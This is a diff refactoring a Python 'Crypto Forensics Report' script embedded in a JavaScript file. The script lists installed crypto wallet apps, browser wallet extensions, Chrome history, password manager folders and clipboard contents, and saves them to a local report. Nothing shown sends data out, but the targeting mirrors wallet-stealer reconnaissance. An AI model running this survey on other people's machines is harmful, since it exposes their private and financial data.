@@ -1,7 +1,5 @@
 // === DESKTOP PYTHON SCRIPT ===
-const pythonScript = `import os
-import platform
-import hashlib
+const pythonScript = `import os, re, platform, hashlib
 
 APPS = [
     "Trust", "MetaMask", "Coinbase", "Binance", "Phantom", "TokenPocket", "TronLink",
@@ -44,21 +42,26 @@ def check_apps():
         try:
             import winreg
             for hive in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
-                try:
-                    key = winreg.OpenKey(hive, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall")
-                    for i in range(0, winreg.QueryInfoKey(key)[0]):
-                        skey = winreg.EnumKey(key, i)
-                        try:
-                            subkey = winreg.OpenKey(key, skey)
-                            disp = winreg.QueryValueEx(subkey, "DisplayName")[0]
-                            if any(app.lower() in disp.lower() for app in APPS):
-                                found.append(disp)
-                        except:
-                            pass
-                except:
-                    pass
-        except:
-            pass
+                for sub_path in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
+                    try:
+                        key = winreg.OpenKey(hive, sub_path)
+                        for i in range(winreg.QueryInfoKey(key)[0]):
+                            try:
+                                skey = winreg.EnumKey(key, i)
+                                subkey = winreg.OpenKey(key, skey)
+                                disp = ""
+                                try:
+                                    disp = winreg.QueryValueEx(subkey, "DisplayName")[0]
+                                except:
+                                    continue
+                                if disp and any(app.lower() in disp.lower() for app in APPS):
+                                    found.append(disp)
+                            except:
+                                continue
+                    except:
+                        continue
+        except Exception as e:
+            found.append(f"[!] winreg error: {e}")
     else:
         for d in ["/Applications", os.path.join(HOME, ".local/share/applications")]:
             if os.path.exists(d):
@@ -69,13 +72,14 @@ def check_apps():
 
 def check_browser_wallet_extensions():
     found = []
-    chromepaths = [
-        os.path.join(HOME, ".config/google-chrome/Default/Extensions"),
-        os.path.join(HOME, "AppData/Local/Google/Chrome/User Data/Default/Extensions"),
-        os.path.join(HOME, "Library/Application Support/Google/Chrome/Default/Extensions"),
-        os.path.join(HOME, ".mozilla/firefox")
+    plat = platform.system()
+    chrome_paths = [
+        os.path.join(HOME, ".config", "google-chrome", "Default", "Extensions"),
+        os.path.join(HOME, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Extensions"),
+        os.path.join(HOME, "Library", "Application Support", "Google", "Chrome", "Default", "Extensions"),
+        os.path.join(HOME, ".mozilla", "firefox")
     ]
-    for p in chromepaths:
+    for p in chrome_paths:
         if os.path.exists(p):
             for r, dirs, f in os.walk(p):
                 for d in dirs:
@@ -118,11 +122,11 @@ def scan_browser_history():
         import sqlite3
         plat = platform.system()
         if plat == "Windows":
-            hp = os.path.join(HOME, "AppData/Local/Google/Chrome/User Data/Default/History")
+            hp = os.path.join(HOME, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History")
         elif plat == "Darwin":
-            hp = os.path.join(HOME, "Library/Application Support/Google/Chrome/Default/History")
+            hp = os.path.join(HOME, "Library", "Application Support", "Google", "Chrome", "Default", "History")
         else:
-            hp = os.path.join(HOME, ".config/google-chrome/Default/History")
+            hp = os.path.join(HOME, ".config", "google-chrome", "Default", "History")
         if os.path.exists(hp):
             tmp = "temp_history"
             copy2(hp, tmp)
@@ -142,13 +146,18 @@ def scan_browser_history():
 
 def scan_password_managers():
     found = []
+    try:
+        user_dirs = os.listdir(HOME)
+    except Exception as e:
+        user_dirs = []
     for name in ["LastPass", "Bitwarden", "Dashlane", "KeePass", "Chrome", "Edge"]:
-        if name.lower() in os.listdir(HOME):
-            found.append(name)
+        for d in user_dirs:
+            if name.lower() in d.lower():
+                found.append(name)
     return found
 
 def main():
-    global REPORT  # ← This must be first line inside main()
+    global REPORT
     REPORT.append("=== [Crypto Forensics Report] ===")
     REPORT.append(f"[System]: {platform.system()} - {platform.node()}")
     REPORT.append("\n--- Installed Crypto Wallet Apps ---")
@@ -167,8 +176,7 @@ def main():
     REPORT += scan_browser_history()
     REPORT.append("\n--- Clipboard (if suspicious) ---")
     cb = check_clipboard()
-    if cb:
-        REPORT.append(cb)
+    if cb: REPORT.append(cb)
     with open("crypto_forensics_report.txt", "w", encoding="utf8") as f:
         for line in REPORT:
             f.write(str(line) + "\n")
